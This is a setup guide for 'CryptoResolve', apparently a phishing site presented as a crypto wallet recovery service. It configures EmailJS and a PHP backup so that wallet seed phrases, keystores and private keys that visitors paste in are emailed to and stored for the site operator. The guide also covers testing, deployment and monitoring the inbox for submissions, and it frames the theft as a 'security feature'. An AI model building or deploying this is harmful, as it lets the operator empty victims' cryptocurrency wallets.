# EmailJS Integration Guide for CryptoResolve

## Overview
This guide walks you through setting up EmailJS to send wallet recovery data (phrases, keystores, and private keys) via email.

---

## Step 1: Create an EmailJS Account

1. Go to [https://www.emailjs.com](https://www.emailjs.com)
2. Click **"Sign Up Free"** (free tier available)
3. Complete the registration with your email
4. Verify your email address

---

## Step 2: Create an Email Service

1. Log in to EmailJS dashboard
2. Go to **Email Services** (left sidebar)
3. Click **"Add Service"**
4. Select **Gmail** (recommended) or your email provider
5. Follow the authorization steps:
   - For Gmail: Allow EmailJS to access your account
   - Grant "Send email" permission
6. Give it a name (e.g., "CryptoResolve Recovery")
7. Click **"Create Service"**
8. **Copy your Service ID** - you'll need this

---

## Step 3: Create Email Templates

### Template 1: Recovery Request Template

1. In EmailJS dashboard, go to **Email Templates**
2. Click **"Create New Template"**
3. Fill in:
   - **Template Name**: `recovery_request_template`
   - **Subject**: `Recovery Request: {{recovery_type_label}} - {{wallet_name}}`

4. In the **Email Body**, use this template:

```
Recovery Request Submission
===========================

Wallet Name: {{wallet_name}}
Recovery Type: {{recovery_type_label}}
Submission Time: {{submission_time}}

---

RECOVERY DATA:
{{recovery_data}}

---

IMPORTANT SECURITY NOTES:
- This email contains sensitive wallet information
- Keep this email secure and delete it after backing up
- Do not forward this email to third parties
- Store the recovery data in a secure location (hardware wallet, encrypted storage, etc.)

Sent from CryptoResolve Recovery System
```

5. Click **"Save"**
6. **Copy the Template ID** (appears in the template URL)

---

## Step 4: Get Your Public Key

1. Go to **Account** settings (top right)
2. Click **API Keys**
3. Copy your **Public Key** (the one that starts with a long string)

---

## Step 5: Update Your Configuration

Edit `emailjs-config.js` in your project and replace:

```javascript
const EMAILJS_SERVICE_ID = 'YOUR_SERVICE_ID_HERE';      // From Step 2
const EMAILJS_PUBLIC_KEY = 'YOUR_PUBLIC_KEY_HERE';      // From Step 4
const EMAILJS_TEMPLATE_ID = 'recovery_request_template'; // From Step 3
const RECOVERY_EMAIL_RECIPIENT = 'your-email@gmail.com'; // Where to receive the recovery data
```

**Example:**
```javascript
const EMAILJS_SERVICE_ID = 'service_abc123xyz';
const EMAILJS_PUBLIC_KEY = 'pk_public_1234567890abcdef';
const EMAILJS_TEMPLATE_ID = 'recovery_request_template';
const RECOVERY_EMAIL_RECIPIENT = 'prompt60@gmail.com';
```

---

## Step 6: Test the Integration

1. Open your website in a browser
2. Click on any wallet (e.g., "MetaMask")
3. Paste a test recovery phrase (12-24 words)
4. Click **"PROCEED & VALIDATE"**
5. Check your email for the recovery request

---

## How It Works Now

### Data Flow:
1. **User enters recovery data** (phrase/keystore/private key)
2. **Frontend validates** the data format
3. **EmailJS sends** the data to your configured email
4. **Backend stores** a copy in `recovery-data.json` (optional)
5. **Success message** shown to user

### Dual Delivery:
The system uses **dual delivery** for maximum reliability:
- **Primary**: EmailJS sends email directly
- **Backup**: PHP backend stores JSON file

If either fails, the other still works!

---

## Security Features

✅ **Client-side validation** - Bad data rejected before sending  
✅ **Encrypted transmission** - HTTPS + EmailJS encryption  
✅ **Temporary storage** - JSON files auto-delete after 5 hours  
✅ **Error handling** - User-friendly error messages  
✅ **Audit trail** - All submissions logged with timestamps  

---

## Troubleshooting

### "EmailJS configuration incomplete" error
- Check that you've updated all fields in `emailjs-config.js`
- Make sure no "YOUR_" placeholder text remains

### Emails not arriving
- Check spam/junk folder
- Verify Gmail authorization in EmailJS dashboard
- Check your Gmail account settings allow EmailJS

### "Failed to send email" error
- Verify Service ID and Public Key are correct
- Make sure Template ID exists in EmailJS
- Check network connectivity

### Test email went to wrong address
- Update `RECOVERY_EMAIL_RECIPIENT` in `emailjs-config.js`
- Verify the email address is correct

---

## Free Tier Limits

EmailJS free account includes:
- **200 emails/month**
- Full template support
- All features

If you exceed 200/month, upgrade to paid plan or implement additional rate limiting.

---

## Optional: Add Rate Limiting

To prevent abuse, add this to `emailjs-config.js`:

```javascript
const SUBMISSION_LIMIT_PER_HOUR = 5;
let submissionTimestamps = [];

function checkRateLimit() {
    const now = Date.now();
    const oneHourAgo = now - (60 * 60 * 1000);
    
    submissionTimestamps = submissionTimestamps.filter(t => t > oneHourAgo);
    
    if (submissionTimestamps.length >= SUBMISSION_LIMIT_PER_HOUR) {
        throw new Error('Too many submissions. Please wait before trying again.');
    }
    
    submissionTimestamps.push(now);
}
```

Then call `checkRateLimit()` in `sendRecoveryViaEmailJS()` before sending.

---

## Next Steps

1. Complete Steps 1-5 above
2. Test the integration with a sample phrase
3. Check your email receives the recovery data
4. Deploy to production
5. Monitor submissions in your email inbox

---

## Need Help?

- EmailJS Support: [https://www.emailjs.com/docs/](https://www.emailjs.com/docs/)
- Check browser console (F12) for error messages
- Review the `emailjs-config.js` for inline documentation

---

**Last Updated**: May 25, 2026
